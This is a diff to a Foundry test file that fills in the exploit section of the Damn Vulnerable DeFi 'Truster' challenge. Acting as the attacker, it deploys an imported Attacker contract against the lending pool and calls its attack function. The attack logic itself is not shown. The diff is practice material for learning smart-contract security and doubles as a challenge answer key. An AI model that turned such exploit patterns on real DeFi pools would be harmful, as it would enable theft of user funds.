@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
+import {Attacker} from "../../../src/Contracts/truster/attack.sol";
 
 contract Truster is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
@@ -37,6 +38,16 @@ contract Truster is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+
+        Attacker attackContract = new Attacker(
+            address(trusterLenderPool),
+            address(dvt)
+        );
+        dvt.approve(address(attackContract), 1_000_000e18);
+        attackContract.attack();
+
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
